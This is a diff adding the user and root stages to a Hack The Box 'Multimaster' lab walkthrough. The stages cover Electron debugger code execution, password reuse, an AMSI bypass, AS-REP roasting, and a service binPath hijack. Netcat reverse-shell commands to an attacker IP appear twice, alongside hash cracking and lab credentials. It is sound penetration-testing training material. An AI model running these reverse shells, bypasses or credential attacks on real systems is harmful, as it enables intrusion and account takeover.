@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/multimaster.png
-tags: ["HTB"]
+tags: ["HTB", "active-directory", "wfuzz", "waf", "filter", "unicode", "sqlmap", "tamper", "hashcat", "crackmapexec", "python", "sqli", "injection", "windows", "mssql", "rid", "evil-winrm", "cef-debugging", "reverse-engineering", "bloodhound", "amsi", "powersploit", "as-rep-roast", "server-operators", "service", "service-hijack", "sebackupprivilege", "serestoreprivilege"]
 ---
 
 # Multimaster
@@ -574,7 +574,516 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\alcibiades\Documents>
 ```
-## User
 
 
+## User #1
+- If we enumerate, we see `Code` application
+```
+*Evil-WinRM* PS C:\Users\alcibiades\Documents> get-process
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    413      22    13884       9552               264   1 Code
+    404      54    96576     114656              1672   1 Code
+    404      53    96584      53792              2052   1 Code
+    278      53    45172      61420              2412   1 Code
+    277      51    58304      61732              2644   1 Code
+    658      48    33332      71980              3328   1 Code
+    407      56   135720     170088              5228   1 Code
+    214      15     6144       4192              5296   1 Code
+    276      51    58184      23668              5672   1 Code
+    318      31    39936      28428              6008   1 Code
+    355      13     1872       4248               368   0 csrss
+...
+```
+```
+*Evil-WinRM* PS C:\program files> ls
+
+
+    Directory: C:\program files
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/25/2019  10:59 AM                Common Files
+d-----         1/9/2020   2:39 PM                Internet Explorer
+d-----         1/7/2020   9:40 PM                Microsoft
+da----         1/7/2020   7:47 PM                Microsoft SQL Server
+d-----         1/7/2020   7:26 PM                Microsoft Visual Studio 10.0
+da----         1/9/2020   3:18 AM                Microsoft VS Code
+d-----         1/7/2020   7:27 PM                Microsoft.NET
+d-----         1/7/2020   9:43 PM                Reference Assemblies
+d-----        7/19/2021   1:07 AM                VMware
+d-r---         1/9/2020   2:46 PM                Windows Defender
+d-----         1/9/2020   2:39 PM                Windows Mail
+d-----         1/9/2020   2:39 PM                Windows Media Player
+d-----        7/16/2016   6:23 AM                Windows Multimedia Platform
+d-----        7/16/2016   6:23 AM                Windows NT
+d-----         1/9/2020   2:39 PM                Windows Photo Viewer
+d-----        7/16/2016   6:23 AM                Windows Portable Devices
+d-----        7/16/2016   6:23 AM                WindowsPowerShell
+```
+
+- We have a pretty old `Visual Studio` running
+  - There was a lot of googling, but essentially
+    - `Visual Studio` is built on `Electron`
+    - And `Electron` leaves `debugger` enabled
+  - We can check for existense of debugger sockets
+    - https://github.com/taviso/cefdebug
+```
+*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> .\cefdebug.exe
+cefdebug.exe : [2023/10/15 04:04:15:3788] U: There are 6 tcp sockets in state listen.
+    + CategoryInfo          : NotSpecified: ([2023/10/15 04:...n state listen.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2023/10/15 04:04:35:4556] U: There were 4 servers that appear to be CEF debuggers.
+[2023/10/15 04:04:35:4556] U: ws://127.0.0.1:46429/82d09d60-7b67-4d29-82ac-4bbef694e26b
+[2023/10/15 04:04:35:4556] U: ws://127.0.0.1:51469/864bcab8-5e95-4dc3-99c8-48ccf8669bcd
+[2023/10/15 04:04:35:4556] U: ws://127.0.0.1:17095/7f4e7f80-a560-4708-a031-b8b1b22f688f
+[2023/10/15 04:04:35:4556] U: ws://127.0.0.1:6279/da22c63e-5b04-4cea-8e4a-a5c535aaaa9e
+```
+
+- We can check version 
+  - Note, sockets last few seconds, so we have to run `.exe` without args to find the sockets
+```
+*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> .\cefdebug.exe --code "process.version" --url ws://127.0.0.1:29638/05b95af9-71ae-40e9-a8a4-43b90f07fda5
+cefdebug.exe : [2023/10/15 04:09:38:1024] U: >>> process.version
+    + CategoryInfo          : NotSpecified: ([2023/10/15 04:...process.version:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2023/10/15 04:09:38:1024] U: <<< v10.11.0
+```
+
+- Let's get reverse shell
+```
+*Evil-WinRM* PS C:\programdata> .\cefdebug.exe --code "process.mainModule.require('child_process').exec('C:\\programdata\\nc.exe 10.10.16.9 443 -e cmd.exe')" --url ws://127.0.0.1:56407/8c993c24-1acd-45e5-a87e-0131fef41a87
+cefdebug.exe : [2023/10/15 04:21:08:1041] U: >>> process.mainModule.require('child_process').exec('C:\\programdata\\nc.exe 10.10.16.9 443 -e cmd.exe')
+    + CategoryInfo          : NotSpecified: ([2023/10/15 04:...43 -e cmd.exe'):String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2023/10/15 04:21:08:1041] U: <<< ChildProcess
+*Evil-WinRM* PS C:\programdata> 
+
+```
+```
+└─$ rlwrap nc -vlnp 443 
+listening on [any] 443 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.10.179] 50361
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\Microsoft VS Code>whoami
+whoami
+megacorp\cyork
+
+C:\Program Files\Microsoft VS Code>
+
+```
+## User #2
+- We are `developers`
+  - So now we can check `inetpub\wwwroot\`
+```
+C:\Program Files\Microsoft VS Code>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID                                          
+============== =============================================
+megacorp\cyork S-1-5-21-3167813660-1240564177-918740779-3107
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes                                        
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only                          
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
+MEGACORP\Developers                        Group            S-1-5-21-3167813660-1240564177-918740779-3119 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                     
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+```
+
+- Inside we have custom `dll`
+```
+C:\inetpub\wwwroot>dir bin
+dir bin
+ Volume in drive C has no label.
+ Volume Serial Number is 7B4A-4B5F
+
+ Directory of C:\inetpub\wwwroot\bin
+
+01/07/2020  10:28 PM    <DIR>          .
+01/07/2020  10:28 PM    <DIR>          ..
+02/21/2013  08:13 PM           102,912 Antlr3.Runtime.dll
+02/21/2013  08:13 PM           431,616 Antlr3.Runtime.pdb
+05/24/2018  01:08 AM            40,080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
+07/24/2012  11:18 PM            45,416 Microsoft.Web.Infrastructure.dll
+01/09/2020  05:13 AM            13,824 MultimasterAPI.dll
+01/09/2020  05:13 AM            28,160 MultimasterAPI.pdb
+02/17/2018  09:14 PM           664,576 Newtonsoft.Json.dll
+01/07/2020  10:28 PM    <DIR>          roslyn
+11/28/2018  12:30 AM           178,808 System.Net.Http.Formatting.dll
+11/28/2018  12:28 AM            27,768 System.Web.Cors.dll
+01/27/2015  03:34 PM           139,976 System.Web.Helpers.dll
+11/28/2018  12:31 AM            39,352 System.Web.Http.Cors.dll
+11/28/2018  12:31 AM           455,096 System.Web.Http.dll
+01/31/2018  11:49 PM            77,520 System.Web.Http.WebHost.dll
+01/27/2015  03:32 PM           566,472 System.Web.Mvc.dll
+02/11/2014  02:56 AM            70,864 System.Web.Optimization.dll
+01/27/2015  03:32 PM           272,072 System.Web.Razor.dll
+01/27/2015  03:34 PM            41,672 System.Web.WebPages.Deployment.dll
+01/27/2015  03:34 PM           211,656 System.Web.WebPages.dll
+01/27/2015  03:34 PM            39,624 System.Web.WebPages.Razor.dll
+07/17/2013  04:33 AM         1,276,568 WebGrease.dll
+              20 File(s)      4,724,032 bytes
+               3 Dir(s)   6,298,828,800 bytes free
+```
+```
+└─$ file MultimasterAPI.dll 
+MultimasterAPI.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
+```
+- We can use `dnspy` for reversing or 
+  - Let's just start with the `strings`
+  - We will find the password
+```
+└─$ strings -el MultimasterAPI.dll
+'C]v}
+{{ action = {0}, id = {1} }}
+{{ id = {0} }}
+~/bundles/jquery
+~/Scripts/jquery-{version}.js
+~/bundles/jqueryval
+~/Scripts/jquery.validate*
+~/bundles/modernizr
+~/Scripts/modernizr-*
+~/bundles/bootstrap
+~/Scripts/bootstrap.js
+~/Content/css
+~/Content/bootstrap.css
+~/Content/site.css
+{resource}.axd/{*pathInfo}
+Default
+{controller}/{action}/{id}
+Index
+DefaultApi
+api/{controller}/{id}
+/api/getColleagues
+UNION
+SELECT
+JOIN
+EXEC
+ORDER
+WAITFOR
+DELAY
+FROM
+WHERE
+LIKE
+INFORMATION_SCHEMA
+MASTER
+{ "info" : "MegaCorp API" }
+application/json
+server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
+name
+Select * from Colleagues where name like '%{0}%'
+...
+```
+- If we test for password-reuse, we have a hit
+```
+─$ crackmapexec smb 10.10.10.179 -u users.list -p 'D3veL0pM3nT!'
+SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Privileged:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\alice:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\test:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\dai:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-sql:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\SQLServer2005SQLBrowserUser:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! 
+```
+
+- `sbauer` can `winrm` 
+```
+└─$ evil-winrm -u 'MEGACORP\sbauer' -p 'D3veL0pM3nT!' -i 10.10.10.179
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sbauer\Documents>
+```
+## User #3
+- Let's run `bloodhound` to gather domain information
+  - I ran it with `tushikikatomo` creds before, but had nothing interesting
+```
+└─$ bloodhound-python -u sbauer -p 'D3veL0pM3nT!' -d megacorp.local -dc multimaster.megacorp.local -ns 10.10.10.179 -c ALL --zip
+INFO: Found AD domain: megacorp.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Connecting to LDAP server: multimaster.megacorp.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: multimaster.megacorp.local
+INFO: Found 28 users
+INFO: Found 57 groups
+INFO: Found 2 gpos
+INFO: Found 10 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: MULTIMASTER.MEGACORP.LOCAL
+INFO: Done in 00M 28S
+INFO: Compressing output into 20231015123725_bloodhound.zip
+```
+
+- `sbauer` has `GenericWrite` over `jorden` who is a member of `Server Operators`
+  - [Server Operators](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#server-operators)
+
+![](./images/5.png)
+
+- We can either set `SPN` or make user `AS-REP`-roastable
+  - There is `AMSI` enabled
+```
+*Evil-WinRM* PS C:\programdata> import-module .\powerview.ps1
+At C:\programdata\powerview.ps1:1 char:1
++ #requires -version 2
++ ~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At C:\programdata\powerview.ps1:1 char:1
++ #requires -version 2
++ ~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+```
+- Let's bypass it using `evil-winrm`
+```
+*Evil-WinRM* PS C:\programdata> menu
+
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+```
+```
+*Evil-WinRM* PS C:\programdata> Bypass-4MSI
+                                        
+Info: Patching 4MSI, please be patient...
+                                        
+[+] Success!
+```
+
+- We will set `UF_DONT_REQUIRE_PREAUTH`
+  - http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm
+```
+*Evil-WinRM* PS C:\programdata> Get-DomainUser jorden | ConvertFrom-UACValue
+
+Name                           Value
+----                           -----
+NORMAL_ACCOUNT                 512
+DONT_EXPIRE_PASSWORD           65536
+```
+```
+*Evil-WinRM* PS C:\programdata> Get-DomainUser jorden | ConvertFrom-UACValue
+
+Name                           Value
+----                           -----
+NORMAL_ACCOUNT                 512
+DONT_EXPIRE_PASSWORD           65536
+
+
+*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity jorden -XOR @{useraccountcontrol=4194304} -Verbose
+Verbose: [Get-DomainSearcher] search base: LDAP://DC=MEGACORP,DC=LOCAL
+Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=jorden)(name=jorden)(displayname=jorden))))
+Verbose: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'jorden'
+```
+```
+*Evil-WinRM* PS C:\programdata> Get-DomainUser jorden | ConvertFrom-UACValue
+
+Name                           Value
+----                           -----
+NORMAL_ACCOUNT                 512
+DONT_EXPIRE_PASSWORD           65536
+DONT_REQ_PREAUTH               4194304
+
+
+*Evil-WinRM* PS C:\programdata>
+```
+- Let's use `impacket-GetNPUsers`
+```
+└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.179 MEGACORP/jorden                                                                                                        
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for jorden
+$krb5asrep$23$jorden@MEGACORP:b8aa6ac1a239e016faeb9ac1d73f7b59$2535eb23e7361e0851b1098fdbd6af879445a606ea31ba85743ca7a56233efed0a6d4215fc7239368b91f76522fe03d1c91e8fd7da53f58725a413d9a860469fc29f0f5bc804d8600ac4e5c82079adb2851381751d16a4b9b42b37b25c1356cfbf6df694436c57fdcc5b1fc9c444143d1fd67935b77ee3b3bd841e682323454eb68a5080b7ec587244df86d7b1e2911859137501d6c97f5a3fa4f3ed2091854b4235567a4aa8ece93116799738c54c0f59c561522fa8f8576b705320d027d91e90e6d5023d6e849af7662afd36f5d53ba4209a4d8b5e142028a15b6b7e2fdf7dbfe98408c8a32d4cfc9a
+```
+
+- Crack it using `hashcat`
+```
+└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU
+...
+$krb5asrep$23$jorden@MEGACORP:b8aa6ac1a239e016faeb9ac1d73f7b59$2535eb23e7361e0851b1098fdbd6af879445a606ea31ba85743ca7a56233efed0a6d4215fc7239368b91f76522fe03d1c91e8fd7da53f58725a413d9a860469fc29f0f5bc804d8600ac4e5c82079adb2851381751d16a4b9b42b37b25c1356cfbf6df694436c57fdcc5b1fc9c444143d1fd67935b77ee3b3bd841e682323454eb68a5080b7ec587244df86d7b1e2911859137501d6c97f5a3fa4f3ed2091854b4235567a4aa8ece93116799738c54c0f59c561522fa8f8576b705320d027d91e90e6d5023d6e849af7662afd36f5d53ba4209a4d8b5e142028a15b6b7e2fdf7dbfe98408c8a32d4cfc9a:rainforest786
+...
+```
+
+- And we have access
+```
+└─$ evil-winrm -u "MEGACORP\jorden" -p rainforest786 -i 10.10.10.179
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jorden\Documents> 
+
+```
 ## Root
+- Since `jorden` is `Server Operator`, we can start and stop services
+  - [Server Operators](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#server-operators)
+```
+*Evil-WinRM* PS C:\Users\jorden\Documents> net user jorden
+User name                    jorden
+Full Name                    Jorden Mclean
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/9/2020 5:48:17 PM
+Password expires             Never
+Password changeable          1/10/2020 5:48:17 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/15/2023 6:07:45 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use*Server Operators
+Global Group memberships     *Domain Users         *Developers
+The command completed successfully.
+
+```
+
+- Let's see which services we can edit
+  - We can use `winpeas` or `PrivescCheck` for that
+```
+*Evil-WinRM* PS C:\programdata> Bypass-4MSI
+                                        
+Info: Patching 4MSI, please be patient...
+                                        
+[+] Success!
+*Evil-WinRM* PS C:\programdata> import-module .\pc.ps1
+*Evil-WinRM* PS C:\programdata> Invoke-PrivescCheck
++------+------------------------------------------------+------+
+| TEST | USER > Identity                                | INFO |
++------+------------------------------------------------+------+
+| DESC | Get the full name of the current user (domain +       |
+|      | username) along with the associated Security          |
+|      | Identifier (SID).                                     |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+...
++------+------------------------------------------------+------+
+| TEST | SERVICES > Service Permissions                 | VULN |
++------+------------------------------------------------+------+
+| DESC | Interact with the Service Control Manager (SCM) and   |
+|      | check whether the current user can modify any         |
+|      | registered service.                                   |
++------+-------------------------------------------------------+
+[*] Found 394 result(s).
+...
++------+------------------------------------------------+------+
+| TEST | SERVICES > Registry Permissions                | VULN |
++------+------------------------------------------------+------+
+| DESC | Parse the registry and check whether the current user |
+|      | can modify the configuration of any registered        |
+|      | service.                                              |
++------+-------------------------------------------------------+
+[*] Found 197 result(s).
+...
+```
+
+- With trial and error, I found suitable service and modified it's binary path
+  - Then had to change `start` mode to `auto`, since it was disabled
+  - Then we start our listener and start the service
+```
+*Evil-WinRM* PS C:\programdata> sc.exe config usosvc binPath="C:\programdata\nc.exe 10.10.16.9 445 -e cmd.exe"
+[SC] ChangeServiceConfig SUCCESS
+```
+```
+*Evil-WinRM* PS C:\programdata> sc.exe config usosvc start=auto
+[SC] ChangeServiceConfig SUCCESS
+```
+```
+*Evil-WinRM* PS C:\programdata> sc.exe start usosvc
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+```
+
+![](./images/6.png)
+
+- [0xdf](https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#unintended-paths) shows unintented path in his blog
